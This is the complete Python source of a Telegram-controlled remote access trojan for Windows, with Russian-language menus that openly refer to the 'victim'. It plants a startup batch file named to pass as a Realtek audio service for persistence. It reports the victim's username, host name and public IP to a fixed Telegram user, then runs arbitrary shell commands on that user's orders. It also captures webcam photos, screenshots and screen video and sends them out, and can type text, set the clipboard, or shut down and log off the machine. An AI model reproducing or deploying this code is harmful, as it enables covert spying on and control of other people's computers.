import getpass
import socket
import time
import numpy as np
import telebot
import pyautogui
import os
import cv2
import keyboard
import pyperclip
import requests
import ctypes
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from io import BytesIO
from PIL import Image
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import comtypes

API_TOKEN = ''

USER_ID = 5515358231

bot = telebot.TeleBot(API_TOKEN)

file_path = os.path.dirname(os.path.realpath(__file__))
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
with open(bat_path + '\\' + "RtkAudUService64.bat", "w+") as bat_file:
    bat_file.write(r'start "" %s' % file_path + r"\!NIKITA_BOT_API_LARISA2.pyw" + '\n exit')

def camera():
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    retval, image = cap.read()
    image_bytes = cv2.imencode('.jpg', image)[1].tobytes()
    cap.release()
    bot.send_photo(USER_ID,image_bytes)

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
    screenshot.save(screenshot_path)
    photo1 = open(screenshot_path, "rb")
    bot.send_photo(USER_ID, photo1)
    photo1.close()
    os.remove(screenshot_path)

def WRITE_TEXT(arg):
    keyboard.write(arg)

def CLIPBOARD(arg):
    pyperclip.copy(arg)

def CMD(arg):
    command = arg
    os.system(arg)

def WALLPAPER(arg):
    image_url = arg
    get_url = requests.get(image_url)
    image = Image.open(BytesIO(get_url.content))
    image_path = r'C:\Users\Public\Downloads\screenshot10100.png'
    image.save(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
    image.close()
    os.remove(image_path)

def GET_SOUND():
    comtypes.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    current_volume = int(volume.GetMasterVolumeLevelScalar() * 100)
    comtypes.CoUninitialize()
    return current_volume


def SOUND(arg):
    comtypes.CoInitialize()

    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Установите уровень громкости (от 0.0 до 1.0)
    volume_level = float(arg) / 100.0
    volume.SetMasterVolumeLevelScalar(volume_level, None)

    comtypes.CoUninitialize()

def VIDEO_RECORD(arg):
    # Установите разрешение видео и частоту кадров
    screen_width, screen_height = pyautogui.size()
    frame_rate = 11
    fourcc = cv2.VideoWriter_fourcc(*"XVID")

    record_duration = int(arg)  # Измените это значение на желаемую длительность записи

    # Время начала записи
    start_time = time.time()

    # Создайте объект VideoWriter для записи видео
    out = cv2.VideoWriter("desktop_capture.avi", fourcc, frame_rate, (screen_width, screen_height))

    while True:
        # Захватите изображение с экрана
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)

        # Преобразуйте BGR изображение в RGB
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

        # Запишите кадр в видео
        out.write(frame)

        # Остановка записи при нажатии клавиши 'q'
        current_time = time.time()
        if current_time - start_time >= record_duration:
            break
    USER_ID = 5515358231
    video_path = 'desktop_capture.avi'
    out.release()
    cv2.destroyAllWindows()
    with open(video_path, 'rb') as video:
        bot.send_video(USER_ID, video)




@bot.message_handler(commands=['start'])
def start_message(message):
    CHAT_ID = message.chat.id
    if CHAT_ID == USER_ID:
        msg = 'Добро пожаловать в larisa control user bot\n\n' \
              'для использования функционала используйте комманду и аргумент из /commands\n\n' \
              'чтобы включить или обновить клавиатуру используйте /update_keyboard\n\n' \
              'бот работает только с Windows'
        bot.send_message(CHAT_ID, msg)
    else:
        bot.send_message(CHAT_ID, 'не пиши сюда больше')


@bot.message_handler(commands=['commands'])
def commands_list(message):
    CHAT_ID = message.chat.id
    if CHAT_ID == USER_ID:
        msg = 'команда-аргумент (через пробел!!!)\n\n' \
              'screenshot\n\n' \
              'cmd-команда для консоли\n\n' \
              'camera\n\n' \
              'wallpaper-ссылка на картинку\n\n' \
              'alt-tab\n\n' \
              'write-текст\n\n' \
              'record-сколько секунд записывать\n\n' \
              'clipboard-текст\n\n' \
              'power_off\n\n' \
              'reboot\n\n' \
              'logout\n\n' \
              'bubbles\n\n' \
              'sleep_(1 or 2 or 3)\n\n' \
              'kill_explorer\n\n' \
              'start_explorer\n\n' \
              'message-текст\n\n' \
              'sound-число/пустота\n\n' \
              'site-url\n\n' \
              'подробнее про команды вы можете узнать в /commands_help'

        bot.send_message(CHAT_ID, msg)
    else:
        bot.send_message(CHAT_ID, 'я же найду тебя если ты продолжишь')


@bot.message_handler(commands=['commands_help'])
def commands_help(message):
    CHAT_ID = message.chat.id
    if CHAT_ID == USER_ID:
        msg = 'screenshot-делает скриншот\n\n' \
              'cmd-использует встроеную консоль windows для передачи в нее команд\n\n' \
              'camera-делает снимок камеры жертвы (если она есть)\n\n' \
              'wallpaper-ставит на обои ту картинку которую вы захотите\n\n' \
              'alt-tab-ну а че тут обьяснять то\n\n' \
              'write-написать что то например в текстовом редакторе жертвы если он открыт\n\n' \
              'record-записывает видео того чего происходит на экране\n\n' \
              'clipboard-передать в буфер обмена свой текст\n\n' \
              'power_off-выключает компьютер\n\n' \
              'reboot-перезагружает компьютер\n\n' \
              'logout-выходит из системы\n\n' \
              'bubbles-выводит пузырики на экран :)\n\n' \
              'sleep_(1 or 2 or 3)-спящий режим 1 или 2 или 3\n\n' \
              'kill_explorer-убивает проводник\n\n' \
              'start_explorer-открывает проводник\n\n' \
              'message-выводит на экран сообщение\n\n' \
              'sound-меняет громкость звука/или выводит настоящую громкость\n\n' \
              'site - открывает url ссылку'
        bot.send_message(CHAT_ID, msg)
    else:
        bot.send_message(CHAT_ID, 'Я ТЕБЯ УБЬЮ')


@bot.message_handler(commands=['update_keyboard'])
def keyboard_update(message):
    CHAT_ID = message.chat.id
    if CHAT_ID == USER_ID:
        keyboard = telebot.types.ReplyKeyboardMarkup(True, row_width=5)

        button_screenshot = telebot.types.KeyboardButton('screenshot')
        button_camera = telebot.types.KeyboardButton('camera')
        button_alt_tab = telebot.types.KeyboardButton('alt-tab')
        button_power_off = telebot.types.KeyboardButton('power_off')
        button_reboot = telebot.types.KeyboardButton('reboot')
        button_logout = telebot.types.KeyboardButton('logout')
        button_bubbles =  telebot.types.KeyboardButton('bubbles')
        button_sleep_1 = telebot.types.KeyboardButton('sleep_1')
        button_sleep_2 = telebot.types.KeyboardButton('sleep_2')
        button_sleep_3 = telebot.types.KeyboardButton('sleep_3')
        button_kill_explorer = telebot.types.KeyboardButton('kill_explorer')
        button_start_explorer = telebot.types.KeyboardButton('start_explorer')
        button_sound = telebot.types.KeyboardButton('sound')
        button_sound_25 = telebot.types.KeyboardButton('sound 25')
        button_sound_50 = telebot.types.KeyboardButton('sound 50')
        button_sound_75 = telebot.types.KeyboardButton('sound 75')
        button_sound_100 = telebot.types.KeyboardButton('sound 100')

        keyboard.add(button_screenshot, button_camera)
        keyboard.add(button_power_off, button_reboot, button_logout)
        keyboard.add(button_sound, button_sound_25, button_sound_50, button_sound_75 ,button_sound_100)
        keyboard.add(button_bubbles, button_sleep_1, button_sleep_2, button_sleep_3)
        keyboard.add(button_kill_explorer, button_start_explorer)

        bot.send_message(CHAT_ID, 'keyboard update successfully', reply_markup=keyboard)
    else:
        bot.send_message(CHAT_ID, '...')


@bot.message_handler(commands=['help'])
def help_message(message):
    CHAT_ID = message.chat.id
    if CHAT_ID == USER_ID:
        msg = 'Список всех доступных комманд:\n\n' \
              '/commands\n\n' \
              '/commands_help\n\n' \
              '/update_keyboard'
        bot.send_message(CHAT_ID, msg)
    else:
        bot.send_message(CHAT_ID, '<TELEBOT_API_ERROR>\n(__init__.py:968 MainThread)')


@bot.message_handler(content_types='text')
def output_message(message):
    CHAT_ID = message.chat.id
    if CHAT_ID == USER_ID:
        _input_ = message.text
        data = _input_.split(' ')
        if len(data) > 1:
            command = data[0]
            argument = _input_[len(command)+1:]
            if command == 'cmd':
                CMD(argument)
            elif command == 'write':
                WRITE_TEXT(argument)
            elif command == 'clipboard':
                CLIPBOARD(argument)
            elif command == 'wallpaper':
                WALLPAPER(argument)
            elif command == 'message':
                CMD(f'msg %username% {argument}')
            elif command == 'sound':
                SOUND(argument)
            elif command == 'record':
                VIDEO_RECORD(argument)
            elif command == 'site':
                CMD(f'start {argument}')
            else:
                bot.send_message(CHAT_ID, 'неправильно написанна команда')

        else:
            command = _input_
            if command == 'screenshot':
                screenshot()
            elif command == 'camera':
                camera()
            elif command == 'power_off':
                CMD('shutdown /s /t 00')
            elif command == 'reboot':
                CMD('shutdown /r /t 00')
            elif command == 'logout':
                CMD('shutdown /l ')
            elif command == 'bubbles':
                os.startfile("C:\Windows\System32\Bubbles.scr")
            elif command == 'sleep_1':
                os.startfile("C:\Windows\System32\Mystify.scr")
            elif command == 'sleep_2':
                os.startfile("C:\Windows\System32\Ribbons.scr")
            elif command == 'sleep_3':
                os.startfile("C:\Windows\System32\ssText3d.scr")
            elif command == 'kill_explorer':
                CMD('taskkill /f /im explorer.exe')
            elif command == 'start_explorer':
                CMD('start explorer.exe')
            elif command == 'sound':
                bot.send_message(CHAT_ID, f'Volume level => {GET_SOUND()}')
            else:
                bot.send_message(CHAT_ID, 'неправильно написанна команда')
    else:
        bot.send_message(CHAT_ID, 'ты не заебался хуйней заниматься?\nчто вообще не так с твоей жизнью?')


startup = f"""
Бот запущен у пользователя: {getpass.getuser()}, {socket.getfqdn()}
Разрешение экрана: {pyautogui.size()[0]}*{pyautogui.size()[1]}
ip: {requests.get('https://ip.beget.ru/').text}
"""




bot.send_message(USER_ID, startup)

bot.infinity_polling()

